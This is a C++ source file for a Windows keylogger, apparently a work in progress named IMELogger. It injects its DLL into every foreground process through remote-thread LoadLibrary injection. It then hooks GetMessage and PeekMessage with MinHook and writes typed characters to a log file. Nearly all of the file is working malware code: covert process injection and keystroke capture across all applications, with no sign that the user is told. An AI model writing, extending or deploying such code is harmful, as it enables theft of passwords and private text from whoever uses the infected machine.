#include "pch.h"
#include "util.h"
#include "logger.h"
#include "imeLoggerCore.h"
#include "imm.h"
#include <set>
#include <windows.h>

// Minhook
// For MinHook
#include "MinHook.h"
#if defined _M_X64
#pragma comment(lib, "libMinHook.x64.lib")
#elif defined _M_IX86
#pragma comment(lib, "libMinHook.x86.lib")
#endif

typedef BOOL(WINAPI* pGetMessageA)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax);
typedef BOOL(WINAPI* pPeekMessageA)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax, UINT wRemoveMsg);
typedef BOOL(WINAPI* pGetMessageW)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax);
typedef BOOL(WINAPI* pPeekMessageW)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax, UINT wRemoveMsg);


bool DLLinject(DWORD pid, const wchar_t* dllPath) {
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL)
	{
		return false;
	}

	LPVOID pDllPath = VirtualAllocEx(hProcess, NULL, (wcslen(dllPath) + 1) * sizeof(wchar_t), MEM_COMMIT, PAGE_READWRITE);
	if (pDllPath == NULL)
	{
		CloseHandle(hProcess);
		return false;
	}

	SIZE_T bytesWritten;
	if (!WriteProcessMemory(hProcess, pDllPath, dllPath, (wcslen(dllPath) + 1) * sizeof(wchar_t), &bytesWritten))
	{
		VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return false;
	}

	HMODULE hKernel32 = GetModuleHandleW(L"Kernel32.dll");
	if (hKernel32 == NULL)
	{
		VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return false;
	}

	LPTHREAD_START_ROUTINE pLoadLibraryW = reinterpret_cast<LPTHREAD_START_ROUTINE>(GetProcAddress(hKernel32, "LoadLibraryW"));
	if (pLoadLibraryW == NULL)
	{
		VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return false;
	}

	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibraryW, pDllPath, 0, NULL);
	if (hThread == NULL)
	{
		VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return false;
	}

	WaitForSingleObject(hThread, INFINITE);

	VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
	CloseHandle(hThread);
	CloseHandle(hProcess);

	return true;
}

bool IMELoggerMain() {
	IMElogger(L"IMELoggerMain Start\r\n");
	wchar_t dllPath[MAX_PATH];
	if (!getDLLPath(dllPath)) {
		if (DEBUG)
			DEBUGlogger(L"IMELoggerMain | Fail to get DLL path");
		return false;
	}
	std::set<DWORD> injectedPIDs;
	DWORD currentPID = GetCurrentProcessId();

	injectedPIDs.insert(currentPID);
	injectedPIDs.insert(GetCurrentThreadId());
	injectedPIDs.insert(0);


	wchar_t debugProcessName[] = L"Notepad.exe";

	char lastTitle[256] = "";
	char currentTitle[256] = "";

	while (TRUE) {
		DWORD targetPID = 0;
		DWORD threadID = GetWindowThreadProcessId(GetForegroundWindow(), &targetPID);
		if (threadID == 0 || targetPID == 0) {
			Sleep(100);
			continue;
		}

		// Ignore this = =
		/* 
		GetWindowTextA(GetForegroundWindow() , currentTitle, sizeof(currentTitle));
		
		if (strcmp(currentTitle, lastTitle) != 0)
		{
			IMEKeyInputlogger(L"\r\n");

			TCHAR titleMsgBuffer[512];

			wsprintf(titleMsgBuffer, L"%s", currentTitle);
			IMEKeyInputlogger(titleMsgBuffer);


			strcpy_s(lastTitle, currentTitle);

		}
		*/

		if (injectedPIDs.find(targetPID) == injectedPIDs.end()) {
			if (DEBUG) {
				// only injection to debug process
				std::wstring processName;
				if (GetProcessNameByPID(targetPID, processName)) {
					if (_wcsicmp(processName.c_str(), debugProcessName) == 0) {
						DLLinject(targetPID, dllPath);
						injectedPIDs.insert(targetPID);

						DEBUGlogger(L"IMELoggerMain | Injected to DEBUG pid: ");
						DEBUGlogger(std::to_wstring(targetPID).c_str());
						DEBUGlogger(L"\r\n");

					}
				}
				continue;
			}
			// If pid not in set, inject to pid
			DLLinject(targetPID, dllPath);
			injectedPIDs.insert(targetPID);
			if (DEBUGFILE) {
				DEBUGlogger(L"IMELoggerMain | Injected to pid: ");
				DEBUGlogger(std::to_wstring(targetPID).c_str());
				DEBUGlogger(L"\r\n");

			}
		}

	}

	return true;
}

// detour function

pGetMessageA fpGetMessageA = NULL;
pGetMessageW  fpGetMessageW = NULL;
pPeekMessageW fpPeekMessageW = NULL;
pPeekMessageA fpPeekMessageA = NULL;

// GetMessage
BOOL WINAPI detourGetMessageW(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax) {
	// Call original function
	BOOL result = fpGetMessageW(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax);
	/*
	// Save message to IMEKeyInputlog
	*/
	TCHAR ch = static_cast<TCHAR>(lpMsg->lParam);
	TCHAR msgBuffer[512];
	TCHAR imeDescription[256];

	if (result > 0 && lpMsg)
	{
		if (DEBUGFILE) {
			DWORD msg = lpMsg->message;
			wchar_t buffer[32];
			swprintf(buffer, sizeof(buffer) / sizeof(wchar_t), L"\r\nK_code 0x%04X , %X , %X ", msg, lpMsg->wParam, lpMsg->lParam );
			IMElpmsglogger(buffer);
		}
		//IMEKeyInputlogger(L"`");
		switch (lpMsg->message)
		{

		case WM_CHAR:
			// print ch to IMEKeyInputlog
			
			/*
			if (DEBUG) {
				//print all message lpMsg data
                wsprintf(msgBuffer, L" lpMsg->message: %X\r\nlpMsg->wParam: %X\r\nlpMsg->lParam: %llX\r\n", lpMsg->message, lpMsg->wParam, static_cast<unsigned long long>(lpMsg->lParam));
				MessageBoxW(NULL, msgBuffer, L"WM_CHAR", MB_OK);
			}
			*/
			if (lpMsg->lParam == 1) {
				// if lParam is 1, lpMsg->wParam is unicode
				wsprintf(msgBuffer, L"%c", lpMsg->wParam);
				IMEKeyInputlogger(msgBuffer);

			}
			else if(lpMsg->wParam < 0x10000) {
				wsprintf(msgBuffer, L"%c", lpMsg->wParam);
				IMEKeyInputlogger(msgBuffer);
	
			}
			
			break; 

		case WM_IME_CHAR:
		{
			if (DEBUG) {
				//print all message lpMsg data
				wsprintf(msgBuffer, L" lpMsg->message: %X\r\nlpMsg->wParam: %X\r\nlpMsg->lParam: %llX\r\n", lpMsg->message, lpMsg->wParam, static_cast<unsigned long long>(lpMsg->lParam));
				MessageBoxW(NULL, msgBuffer, L"WM_IME_CHAR", MB_OK);
			}
			IMEKeyInputlogger(L"-");
			MessageBoxA(NULL, "IME_CHAR", "IME_CHAR", MB_OK);
		}
		break;
		
		break;


		default:
			break;
		}
	}

	return result;
}


BOOL WINAPI detourGetMessageA(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax) {
	// Call original function
	BOOL result = fpGetMessageA(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax);
	// Save message to IMEKeyInputlog
	MessageBoxA(NULL, "GetMessageAAAAAAAAAAAAAAAAAAAAAAA", "GetMessageA", MB_OK);

	return result;
}

// PeekMessage
BOOL WINAPI detourPeekMessageW(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax, UINT wRemoveMsg) {
	// Call original function
	BOOL result = fpPeekMessageW(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax, wRemoveMsg);
	/*
	// Save message to IMEKeyInputlog
	const wchar_t* originalText = (const wchar_t*)lpMsg->lParam;
	IMEKeyInputlogger(originalText);
	*/
	return result;
}


BOOL WINAPI detourPeekMessageA(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax, UINT wRemoveMsg) {
	// Call original function
	BOOL result = fpPeekMessageA(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax, wRemoveMsg);
	// Save message to IMEKeyInputlog
	const char* originalText = (const char*)lpMsg->lParam;
	IMEKeyInputlogger((wchar_t*)originalText);

	return result;
}

// injected process main

bool injectProcessMain() {

	DWORD currentPID = GetCurrentProcessId();
	if (DEBUGFILE) {
		DEBUGlogger(L"\r\ninjectProcessMain | injectProcessMain Start\r\n");
		DEBUGlogger(std::to_wstring(currentPID).c_str());
	}

	IMElpmsglogger(L"K_code, wParam, lParam\r\n");

	wchar_t dllPath[MAX_PATH];
	if (!getDLLPath(dllPath)) {
		if (DEBUGFILE)
			DEBUGlogger(L"injectProcessMain | Fail to get DLL path");
		return false;
	}

	HINSTANCE hDLL = LoadLibrary(L"User32.dll");
	if (hDLL == NULL) {
		if (DEBUGFILE)
			DEBUGlogger(L"injectProcessMain | Failed to load User32.dll\r\n");
		return false;
	}
	// Initialize MinHook.
	if (MH_Initialize() != MH_OK)
	{
		if (DEBUGFILE)
			DEBUGlogger(L"injectProcessMain | Failed to initialize MinHook.\r\n");
		return false;
	}
	void* pGetMessageA = (void*)GetProcAddress(hDLL, "GetMessageA");
	void* pPeekMessageA = (void*)GetProcAddress(hDLL, "PeekMessageA");
	void* pGetMessageW = (void*)GetProcAddress(hDLL, "GetMessageW");
	void* pPeekMessageW = (void*)GetProcAddress(hDLL, "PeekMessageW");


	if ( !pGetMessageA || !pPeekMessageA || !pGetMessageW || !pPeekMessageW){
		if (DEBUGFILE)
			DEBUGlogger(L"injectProcessMain | Failed to get address of GetMessage or PeekMessage.\r\n");
		return false;
	}

	// Create a hook 
	{	
		if (MH_CreateHook(pGetMessageA, &detourGetMessageA, reinterpret_cast<LPVOID*>(&fpGetMessageA)) != MH_OK)
		{
			if (DEBUGFILE)
				DEBUGlogger(L"injectProcessMain | Failed to create hook for GetMessageA.\r\n");
		}
		if (MH_CreateHook(pPeekMessageA, &detourPeekMessageA, reinterpret_cast<LPVOID*>(&fpPeekMessageA)) != MH_OK)
		{
			if (DEBUGFILE)
				DEBUGlogger(L"injectProcessMain | Failed to create hook for PeekMessageA.\r\n");
		}
		if (MH_CreateHook(pGetMessageW, &detourGetMessageW, reinterpret_cast<LPVOID*>(&fpGetMessageW)) != MH_OK)
		{
			if (DEBUGFILE)
				DEBUGlogger(L"injectProcessMain | Failed to create hook for GetMessageW.\r\n");
		}
		if (MH_CreateHook(pPeekMessageW, &detourPeekMessageW, reinterpret_cast<LPVOID*>(&fpPeekMessageW)) != MH_OK)
		{
			if (DEBUGFILE)
				DEBUGlogger(L"injectProcessMain | Failed to create hook for PeekMessageW.\r\n");
		}
	}
	/*
	MH_EnableHook(pGetMessage);
	MH_EnableHook(pPeekMessage);
	*/
	MH_EnableHook(pGetMessageA);
	MH_EnableHook(pPeekMessageA);
	MH_EnableHook(pGetMessageW);
	MH_EnableHook(pPeekMessageW);


	if (DEBUGFILE) {
		DEBUGlogger(L"\r\ninjectProcessMain | Hook Success Enable \r\n");
		DEBUGlogger(std::to_wstring(currentPID).c_str());
	}
	return true;
}

DWORD WINAPI injectedProcessMainThread(LPVOID lpParam)
{
	injectProcessMain();
	return true;
}